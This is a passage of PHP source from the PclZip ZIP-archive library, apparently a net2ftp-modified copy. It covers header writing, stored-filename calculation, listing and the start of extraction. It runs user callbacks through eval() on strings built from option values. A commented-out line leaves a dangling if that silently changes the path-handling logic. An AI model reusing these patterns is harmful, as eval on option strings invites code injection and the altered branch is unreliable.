  
    // ----- Look for a stored different filename 
    /* TBC : Removed
    if (isset($p_filedescr['stored_filename'])) {
      $v_stored_filename = $p_filedescr['stored_filename'];
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, 'Stored filename is NOT the same "'.$v_stored_filename.'"');
    }
    else {
      $v_stored_filename = $p_filedescr['stored_filename'];
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, 'Stored filename is the same');
    }
    */

    // ----- Set the file properties
    clearstatcache();
    $p_header['version'] = 20;
    $p_header['version_extracted'] = 10;
    $p_header['flag'] = 0;
    $p_header['compression'] = 0;
    $p_header['crc'] = 0;
    $p_header['compressed_size'] = 0;
    $p_header['filename_len'] = strlen($p_filename);
    $p_header['extra_len'] = 0;
    $p_header['disk'] = 0;
    $p_header['internal'] = 0;
    $p_header['offset'] = 0;
    $p_header['filename'] = $p_filename;
// TBC : Removed    $p_header['stored_filename'] = $v_stored_filename;
    $p_header['stored_filename'] = $p_filedescr['stored_filename'];
    $p_header['extra'] = '';
    $p_header['status'] = 'ok';
    $p_header['index'] = -1;

    // ----- Look for regular file
    if ($p_filedescr['type']=='file') {
      $p_header['external'] = 0x00000000;
      $p_header['size'] = filesize($p_filename);
    }
    
    // ----- Look for regular folder
    else if ($p_filedescr['type']=='folder') {
      $p_header['external'] = 0x00000010;
      $p_header['mtime'] = filemtime($p_filename);
      $p_header['size'] = filesize($p_filename);
    }
    
    // ----- Look for virtual file
    else if ($p_filedescr['type'] == 'virtual_file') {
      $p_header['external'] = 0x00000000;
      $p_header['size'] = strlen($p_filedescr['content']);
    }
    
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Header external extension '".sprintf("0x%X",$p_header['external'])."'");

    // ----- Look for filetime
    if (isset($p_filedescr['mtime'])) {
      $p_header['mtime'] = $p_filedescr['mtime'];
    }
    else if ($p_filedescr['type'] == 'virtual_file') {
      $p_header['mtime'] = mktime();
    }
    else {
      $p_header['mtime'] = filemtime($p_filename);
    }

    // ------ Look for file comment
    if (isset($p_filedescr['comment'])) {
      $p_header['comment_len'] = strlen($p_filedescr['comment']);
      $p_header['comment'] = $p_filedescr['comment'];
    }
    else {
      $p_header['comment_len'] = 0;
      $p_header['comment'] = '';
    }

    // ----- Look for pre-add callback
    if (isset($p_options[PCLZIP_CB_PRE_ADD])) {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "A pre-callback '".$p_options[PCLZIP_CB_PRE_ADD]."()') is defined for the extraction");

      // ----- Generate a local information
      $v_local_header = array();
      $this->privConvertHeader2FileInfo($p_header, $v_local_header);

      // ----- Call the callback
      // Here I do not use call_user_func() because I need to send a reference to the
      // header.
      eval('$v_result = '.$p_options[PCLZIP_CB_PRE_ADD].'(PCLZIP_CB_PRE_ADD, $v_local_header);');
      if ($v_result == 0) {
        // ----- Change the file status
        $p_header['status'] = "skipped";
        $v_result = 1;
      }

      // ----- Update the informations
      // Only some fields can be modified
      if ($p_header['stored_filename'] != $v_local_header['stored_filename']) {
        $p_header['stored_filename'] = PclZipUtilPathReduction($v_local_header['stored_filename']);
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "New stored filename is '".$p_header['stored_filename']."'");
      }
    }

    // ----- Look for empty stored filename
    if ($p_header['stored_filename'] == "") {
      $p_header['status'] = "filtered";
    }
    
    // ----- Check the path length
    if (strlen($p_header['stored_filename']) > 0xFF) {
      $p_header['status'] = 'filename_too_long';
    }

    // ----- Look if no error, or file not skipped
    if ($p_header['status'] == 'ok') {

      // ----- Look for a file
//      if (is_file($p_filename))
      if (   ($p_filedescr['type'] == 'file')
          || ($p_filedescr['type'] == 'virtual_file')) {
          
        // ----- Get content from real file
        if ($p_filedescr['type'] == 'file') {        
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "'".$p_filename."' is a file");

          // ----- Open the source file
          if (($v_file = @fopen($p_filename, "rb")) == 0) {
            PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, "Unable to open file '$p_filename' in binary read mode");
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
          }

          // ----- Read the file content
          $v_content = @fread($v_file, $p_header['size']);

          // ----- Close the file
          @fclose($v_file);
        }
        else if ($p_filedescr['type'] == 'virtual_file') {        
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Add by string");
          $v_content = $p_filedescr['content'];
        }

        // ----- Calculate the CRC
        $p_header['crc'] = @crc32($v_content);
        
        // ----- Look for no compression
        if ($p_options[PCLZIP_OPT_NO_COMPRESSION]) {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "File will not be compressed");
          // ----- Set header parameters
          $p_header['compressed_size'] = $p_header['size'];
          $p_header['compression'] = 0;
        }
        
        // ----- Look for normal compression
        else {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "File will be compressed");
          // ----- Compress the content
          $v_content = @gzdeflate($v_content);

          // ----- Set header parameters
          $p_header['compressed_size'] = strlen($v_content);
          $p_header['compression'] = 8;
        }
        
        // ----- Look for encryption
        /*
        if ((isset($p_options[PCLZIP_OPT_CRYPT]))
                    && ($p_options[PCLZIP_OPT_CRYPT] != "")) {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "File need to be crypted ....");
          
          // Should be a random header
          $v_header = 'xxxxxxxxxxxx';
              $v_content_compressed = PclZipUtilZipEncrypt($v_content_compressed,
                                                           $p_header['compressed_size'],
                                                       $v_header,
                                                                                                   $p_header['crc'],
                                                                                                   "test");
                                                                                                   
          $p_header['compressed_size'] += 12;
          $p_header['flag'] = 1;
          
          // ----- Add the header to the data
          $v_content_compressed = $v_header.$v_content_compressed;
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Size after header : ".strlen($v_content_compressed)."");
        }
        */

        // ----- Call the header generation
        if (($v_result = $this->privWriteFileHeader($p_header)) != 1) {
          @fclose($v_file);
          //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
          return $v_result;
        }

        // ----- Write the compressed (or not) content
        @fwrite($this->zip_fd, $v_content, $p_header['compressed_size']);
      }

      // ----- Look for a directory
      else if ($p_filedescr['type'] == 'folder') {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "'".$p_filename."' is a folder");
        // ----- Look for directory last '/'
        if (@substr($p_header['stored_filename'], -1) != '/') {
          $p_header['stored_filename'] .= '/';
        }

        // ----- Set the file properties
        $p_header['size'] = 0;
        //$p_header['external'] = 0x41FF0010;   // Value for a folder : to be checked
        $p_header['external'] = 0x00000010;   // Value for a folder : to be checked

        // ----- Call the header generation
        if (($v_result = $this->privWriteFileHeader($p_header)) != 1)
        {
          //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
          return $v_result;
        }
      }
    }

    // ----- Look for post-add callback
    if (isset($p_options[PCLZIP_CB_POST_ADD])) {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "A post-callback '".$p_options[PCLZIP_CB_POST_ADD]."()') is defined for the extraction");

      // ----- Generate a local information
      $v_local_header = array();
      $this->privConvertHeader2FileInfo($p_header, $v_local_header);

      // ----- Call the callback
      // Here I do not use call_user_func() because I need to send a reference to the
      // header.
      eval('$v_result = '.$p_options[PCLZIP_CB_POST_ADD].'(PCLZIP_CB_POST_ADD, $v_local_header);');
      if ($v_result == 0) {
        // ----- Ignored
        $v_result = 1;
      }

      // ----- Update the informations
      // Nothing can be modified
    }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privCalculateStoredFilename()
  // Description :
  //   Based on file descriptor properties and global options, this method
  //   calculate the filename that will be stored in the archive.
  // Parameters :
  // Return Values :
  // --------------------------------------------------------------------------------
  function privCalculateStoredFilename(&$p_filedescr, &$p_options)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privCalculateStoredFilename", "filename='".$p_filedescr['filename']."'");
    $v_result=1;
    
    // ----- Working variables
    $p_filename = $p_filedescr['filename'];
    if (isset($p_options[PCLZIP_OPT_ADD_PATH])) {
      $p_add_dir = $p_options[PCLZIP_OPT_ADD_PATH];
    }
    else {
      $p_add_dir = '';
    }
    if (isset($p_options[PCLZIP_OPT_REMOVE_PATH])) {
      $p_remove_dir = $p_options[PCLZIP_OPT_REMOVE_PATH];
    }
    else {
      $p_remove_dir = '';
    }
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Remove path ='".$p_remove_dir."'");
    if (isset($p_options[PCLZIP_OPT_REMOVE_ALL_PATH])) {
      $p_remove_all_dir = $p_options[PCLZIP_OPT_REMOVE_ALL_PATH];
    }
    else {
      $p_remove_all_dir = 0;
    }

    // ----- Look for full name change
    if (isset($p_filedescr['new_full_name'])) {
      $v_stored_filename = $p_filedescr['new_full_name'];
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Changing full name of '".$p_filename."' for '".$v_stored_filename."'");
    }
    
    // ----- Look for path and/or short name change
    else {

      // ----- Look for short name change
      if (isset($p_filedescr['new_short_name'])) {
        $v_path_info = pathinfo($p_filename);
        $v_dir = '';
        if ($v_path_info['dirname'] != '') {
          $v_dir = $v_path_info['dirname'].'/';
        }
        $v_stored_filename = $v_dir.$p_filedescr['new_short_name'];
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Changing short name of '".$p_filename."' for '".$v_stored_filename."'");
      }
      else {
        // ----- Calculate the stored filename
        $v_stored_filename = $p_filename;
      }

      // ----- Look for all path to remove
      if ($p_remove_all_dir) {
        $v_stored_filename = basename($p_filename);
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Remove all path selected change '".$p_filename."' for '".$v_stored_filename."'");
      }
      // ----- Look for partial path remove
      else if ($p_remove_dir != "") {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Partial path to remove");
        if (substr($p_remove_dir, -1) != '/')
          $p_remove_dir .= "/";

        if (   (substr($p_filename, 0, 2) == "./")
            || (substr($p_remove_dir, 0, 2) == "./")) {
            
          if (   (substr($p_filename, 0, 2) == "./")
              && (substr($p_remove_dir, 0, 2) != "./")) {
            $p_remove_dir = "./".$p_remove_dir;
          }
          if (   (substr($p_filename, 0, 2) != "./")
              && (substr($p_remove_dir, 0, 2) == "./")) {
            $p_remove_dir = substr($p_remove_dir, 2);
          }
        }

        $v_compare = PclZipUtilPathInclusion($p_remove_dir,
                                             $v_stored_filename);
        if ($v_compare > 0) {
          if ($v_compare == 2) {
            $v_stored_filename = "";
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Path to remove is the current folder");
          }
          else {
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Remove path '$p_remove_dir' in file '$v_stored_filename'");
            $v_stored_filename = substr($v_stored_filename,
                                        strlen($p_remove_dir));
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Result is '$v_stored_filename'");
          }
        }
      }
      // ----- Look for path to add
      if ($p_add_dir != "") {
        if (substr($p_add_dir, -1) == "/")
          $v_stored_filename = $p_add_dir.$v_stored_filename;
        else
          $v_stored_filename = $p_add_dir."/".$v_stored_filename;
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Add path '$p_add_dir' in file '$p_filename' = '$v_stored_filename'");
      }
    }

    // ----- Filename (reduce the path of stored name)
    $v_stored_filename = PclZipUtilPathReduction($v_stored_filename);
    $p_filedescr['stored_filename'] = $v_stored_filename;
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Stored filename will be '".$p_filedescr['stored_filename']."', strlen ".strlen($p_filedescr['stored_filename']));
    
    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privWriteFileHeader()
  // Description :
  // Parameters :
  // Return Values :
  // --------------------------------------------------------------------------------
  function privWriteFileHeader(&$p_header)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privWriteFileHeader", 'file="'.$p_header['filename'].'", stored as "'.$p_header['stored_filename'].'"');
    $v_result=1;

    // ----- Store the offset position of the file
    $p_header['offset'] = ftell($this->zip_fd);
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, 'File offset of the header :'.$p_header['offset']);

    // ----- Transform UNIX mtime to DOS format mdate/mtime
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Date : \''.date("d/m/y H:i:s", $p_header['mtime']).'\'');
    $v_date = getdate($p_header['mtime']);
    $v_mtime = ($v_date['hours']<<11) + ($v_date['minutes']<<5) + $v_date['seconds']/2;
    $v_mdate = (($v_date['year']-1980)<<9) + ($v_date['mon']<<5) + $v_date['mday'];

    // ----- Packed data
    $v_binary_data = pack("VvvvvvVVVvv", 0x04034b50,
                              $p_header['version_extracted'], $p_header['flag'],
                          $p_header['compression'], $v_mtime, $v_mdate,
                          $p_header['crc'], $p_header['compressed_size'],
                                                  $p_header['size'],
                          strlen($p_header['stored_filename']),
                                                  $p_header['extra_len']);

    // ----- Write the first 148 bytes of the header in the archive
    fputs($this->zip_fd, $v_binary_data, 30);

    // ----- Write the variable fields
    if (strlen($p_header['stored_filename']) != 0)
    {
      fputs($this->zip_fd, $p_header['stored_filename'], strlen($p_header['stored_filename']));
    }
    if ($p_header['extra_len'] != 0)
    {
      fputs($this->zip_fd, $p_header['extra'], $p_header['extra_len']);
    }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privWriteCentralFileHeader()
  // Description :
  // Parameters :
  // Return Values :
  // --------------------------------------------------------------------------------
  function privWriteCentralFileHeader(&$p_header)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privWriteCentralFileHeader", 'file="'.$p_header['filename'].'", stored as "'.$p_header['stored_filename'].'"');
    $v_result=1;

    // TBC
    //for(reset($p_header); $key = key($p_header); next($p_header)) {
    //  //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "header[$key] = ".$p_header[$key]);
    //}

    // ----- Transform UNIX mtime to DOS format mdate/mtime
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Date : \''.date("d/m/y H:i:s", $p_header['mtime']).'\'');
    $v_date = getdate($p_header['mtime']);
    $v_mtime = ($v_date['hours']<<11) + ($v_date['minutes']<<5) + $v_date['seconds']/2;
    $v_mdate = (($v_date['year']-1980)<<9) + ($v_date['mon']<<5) + $v_date['mday'];

    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Comment size : \''.$p_header['comment_len'].'\'');

    // ----- Packed data
    $v_binary_data = pack("VvvvvvvVVVvvvvvVV", 0x02014b50,
                              $p_header['version'], $p_header['version_extracted'],
                          $p_header['flag'], $p_header['compression'],
                                                  $v_mtime, $v_mdate, $p_header['crc'],
                          $p_header['compressed_size'], $p_header['size'],
                          strlen($p_header['stored_filename']),
                                                  $p_header['extra_len'], $p_header['comment_len'],
                          $p_header['disk'], $p_header['internal'],
                                                  $p_header['external'], $p_header['offset']);

    // ----- Write the 42 bytes of the header in the zip file
    fputs($this->zip_fd, $v_binary_data, 46);

    // ----- Write the variable fields
    if (strlen($p_header['stored_filename']) != 0)
    {
      fputs($this->zip_fd, $p_header['stored_filename'], strlen($p_header['stored_filename']));
    }
    if ($p_header['extra_len'] != 0)
    {
      fputs($this->zip_fd, $p_header['extra'], $p_header['extra_len']);
    }
    if ($p_header['comment_len'] != 0)
    {
      fputs($this->zip_fd, $p_header['comment'], $p_header['comment_len']);
    }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privWriteCentralHeader()
  // Description :
  // Parameters :
  // Return Values :
  // --------------------------------------------------------------------------------
  function privWriteCentralHeader($p_nb_entries, $p_size, $p_offset, $p_comment)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privWriteCentralHeader", 'nb_entries='.$p_nb_entries.', size='.$p_size.', offset='.$p_offset.', comment="'.$p_comment.'"');
    $v_result=1;

    // ----- Packed data
    $v_binary_data = pack("VvvvvVVv", 0x06054b50, 0, 0, $p_nb_entries,
                              $p_nb_entries, $p_size,
                                                  $p_offset, strlen($p_comment));

    // ----- Write the 22 bytes of the header in the zip file
    fputs($this->zip_fd, $v_binary_data, 22);

    // ----- Write the variable fields
    if (strlen($p_comment) != 0)
    {
      fputs($this->zip_fd, $p_comment, strlen($p_comment));
    }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privList()
  // Description :
  // Parameters :
  // Return Values :
  // --------------------------------------------------------------------------------
  function privList(&$p_list)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privList", "list");
    $v_result=1;

    // ----- Magic quotes trick
    $this->privDisableMagicQuotes();

    // ----- Open the zip file
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Open file in binary read mode");
    if (($this->zip_fd = @fopen($this->zipname, 'rb')) == 0)
    {
      // ----- Magic quotes trick
      $this->privSwapBackMagicQuotes();
      
      // ----- Error log
      PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive \''.$this->zipname.'\' in binary read mode');

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
      return PclZip::errorCode();
    }

    // ----- Read the central directory informations
    $v_central_dir = array();
    if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
    {
      $this->privSwapBackMagicQuotes();
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    // ----- Go to beginning of Central Dir
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Offset : ".$v_central_dir['offset']."'");
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Position in file : ".ftell($this->zip_fd)."'");
    @rewind($this->zip_fd);
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Position in file : ".ftell($this->zip_fd)."'");
    if (@fseek($this->zip_fd, $v_central_dir['offset']))
    {
      $this->privSwapBackMagicQuotes();

      // ----- Error log
      PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
      return PclZip::errorCode();
    }
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Position in file : ".ftell($this->zip_fd)."'");

    // ----- Read each entry
    for ($i=0; $i<$v_central_dir['entries']; $i++)
    {
      // ----- Read the file header
      if (($v_result = $this->privReadCentralFileHeader($v_header)) != 1)
      {
        $this->privSwapBackMagicQuotes();
        //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
        return $v_result;
      }
      $v_header['index'] = $i;

      // ----- Get the only interesting attributes
      $this->privConvertHeader2FileInfo($v_header, $p_list[$i]);
      unset($v_header);
    }

    // ----- Close the zip file
    $this->privCloseFd();

    // ----- Magic quotes trick
    $this->privSwapBackMagicQuotes();

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privConvertHeader2FileInfo()
  // Description :
  //   This function takes the file informations from the central directory
  //   entries and extract the interesting parameters that will be given back.
  //   The resulting file infos are set in the array $p_info
  //     $p_info['filename'] : Filename with full path. Given by user (add),
  //                           extracted in the filesystem (extract).
  //     $p_info['stored_filename'] : Stored filename in the archive.
  //     $p_info['size'] = Size of the file.
  //     $p_info['compressed_size'] = Compressed size of the file.
  //     $p_info['mtime'] = Last modification date of the file.
  //     $p_info['comment'] = Comment associated with the file.
  //     $p_info['folder'] = true/false : indicates if the entry is a folder or not.
  //     $p_info['status'] = status of the action on the file.
  //     $p_info['crc'] = CRC of the file content.
  // Parameters :
  // Return Values :
  // --------------------------------------------------------------------------------
  function privConvertHeader2FileInfo($p_header, &$p_info)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privConvertHeader2FileInfo", "Filename='".$p_header['filename']."'");
    $v_result=1;

    // ----- Get the interesting attributes
    $p_info['filename'] = $p_header['filename'];
    $p_info['stored_filename'] = $p_header['stored_filename'];
    $p_info['size'] = $p_header['size'];
    $p_info['compressed_size'] = $p_header['compressed_size'];
    $p_info['mtime'] = $p_header['mtime'];
    $p_info['comment'] = $p_header['comment'];
    $p_info['folder'] = (($p_header['external']&0x00000010)==0x00000010);
    $p_info['index'] = $p_header['index'];
    $p_info['status'] = $p_header['status'];
    $p_info['crc'] = $p_header['crc'];

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privExtractByRule()
  // Description :
  //   Extract a file or directory depending of rules (by index, by name, ...)
  // Parameters :
  //   $p_file_list : An array where will be placed the properties of each
  //                  extracted file
  //   $p_path : Path to add while writing the extracted files
  //   $p_remove_path : Path to remove (from the file memorized path) while writing the
  //                    extracted files. If the path does not match the file path,
  //                    the file is extracted with its memorized path.
  //                    $p_remove_path does not apply to 'list' mode.
  //                    $p_path and $p_remove_path are commulative.
  // Return Values :
  //   1 on success,0 or less on error (see error code list)
  // --------------------------------------------------------------------------------
  function privExtractByRule(&$p_file_list, $p_path, $p_remove_path, $p_remove_all_path, &$p_options)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privExtractByRule", "path='$p_path', remove_path='$p_remove_path', remove_all_path='".($p_remove_all_path?'true':'false')."'");
    $v_result=1;

    // ----- Magic quotes trick
    $this->privDisableMagicQuotes();

    // ----- Check the path
    if (   ($p_path == "")
            || (   (substr($p_path, 0, 1) != "/")
                    && (substr($p_path, 0, 3) != "../")
                        && (substr($p_path,1,2)!=":/")))
// net2ftp
//      $p_path = "./".$p_path;

    // ----- Reduce the path last (and duplicated) '/'
    if (($p_path != "./") && ($p_path != "/"))
    {
      // ----- Look for the path end '/'
      while (substr($p_path, -1) == "/")
      {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Destination path [$p_path] ends by '/'");
        $p_path = substr($p_path, 0, strlen($p_path)-1);
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Modified to [$p_path]");
      }
    }

    // ----- Look for path to remove format (should end by /)
    if (($p_remove_path != "") && (substr($p_remove_path, -1) != '/'))
    {
      $p_remove_path .= '/';
    }
    $p_remove_path_size = strlen($p_remove_path);

    // ----- Open the zip file
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Open file in binary read mode");
    if (($v_result = $this->privOpenFd('rb')) != 1)
    {
      $this->privSwapBackMagicQuotes();
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    // ----- Read the central directory informations
    $v_central_dir = array();
    if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
    {
      // ----- Close the zip file
      $this->privCloseFd();
      $this->privSwapBackMagicQuotes();

      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    // ----- Start at beginning of Central Dir
    $v_pos_entry = $v_central_dir['offset'];

    // ----- Read each entry
    $j_start = 0;
    for ($i=0, $v_nb_extracted=0; $i<$v_central_dir['entries']; $i++)
    {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Read next file header entry : '$i'");

      // ----- Read next Central dir entry
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Position before rewind : ".ftell($this->zip_fd)."'");
      @rewind($this->zip_fd);
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Position after rewind : ".ftell($this->zip_fd)."'");
      if (@fseek($this->zip_fd, $v_pos_entry))
      {
        // ----- Close the zip file
        $this->privCloseFd();
        $this->privSwapBackMagicQuotes();

        // ----- Error log
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

        // ----- Return
        //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
        return PclZip::errorCode();
      }
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Position after fseek : ".ftell($this->zip_fd)."'");

      // ----- Read the file header
      $v_header = array();
      if (($v_result = $this->privReadCentralFileHeader($v_header)) != 1)
      {
        // ----- Close the zip file
        $this->privCloseFd();
        $this->privSwapBackMagicQuotes();

        //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
        return $v_result;
      }

      // ----- Store the index
      $v_header['index'] = $i;

      // ----- Store the file position
      $v_pos_entry = ftell($this->zip_fd);

      // ----- Look for the specific extract rules
      $v_extract = false;

      // ----- Look for extract by name rule
      if (   (isset($p_options[PCLZIP_OPT_BY_NAME]))
          && ($p_options[PCLZIP_OPT_BY_NAME] != 0)) {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Extract with rule 'ByName'");

          // ----- Look if the filename is in the list
          for ($j=0; ($j<sizeof($p_options[PCLZIP_OPT_BY_NAME])) && (!$v_extract); $j++) {
              //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Compare with file '".$p_options[PCLZIP_OPT_BY_NAME][$j]."'");

              // ----- Look for a directory
              if (substr($p_options[PCLZIP_OPT_BY_NAME][$j], -1) == "/") {
                  //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "The searched item is a directory");

                  // ----- Look if the directory is in the filename path
                  if (   (strlen($v_header['stored_filename']) > strlen($p_options[PCLZIP_OPT_BY_NAME][$j]))
                      && (substr($v_header['stored_filename'], 0, strlen($p_options[PCLZIP_OPT_BY_NAME][$j])) == $p_options[PCLZIP_OPT_BY_NAME][$j])) {
                      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "The directory is in the file path");
                      $v_extract = true;
                  }
              }
              // ----- Look for a filename
              elseif ($v_header['stored_filename'] == $p_options[PCLZIP_OPT_BY_NAME][$j]) {
                  //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "The file is the right one.");
                  $v_extract = true;
              }
          }
      }

      // ----- Look for extract by ereg rule
      else if (   (isset($p_options[PCLZIP_OPT_BY_EREG]))
               && ($p_options[PCLZIP_OPT_BY_EREG] != "")) {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Extract by ereg '".$p_options[PCLZIP_OPT_BY_EREG]."'");

          if (ereg($p_options[PCLZIP_OPT_BY_EREG], $v_header['stored_filename'])) {
              //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Filename match the regular expression");
              $v_extract = true;
          }
      }

      // ----- Look for extract by preg rule
      else if (   (isset($p_options[PCLZIP_OPT_BY_PREG]))
               && ($p_options[PCLZIP_OPT_BY_PREG] != "")) {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Extract with rule 'ByEreg'");

          if (preg_match($p_options[PCLZIP_OPT_BY_PREG], $v_header['stored_filename'])) {
              //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Filename match the regular expression");
              $v_extract = true;
          }
      }

      // ----- Look for extract by index rule
      else if (   (isset($p_options[PCLZIP_OPT_BY_INDEX]))
               && ($p_options[PCLZIP_OPT_BY_INDEX] != 0)) {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Extract with rule 'ByIndex'");
          
          // ----- Look if the index is in the list
          for ($j=$j_start; ($j<sizeof($p_options[PCLZIP_OPT_BY_INDEX])) && (!$v_extract); $j++) {
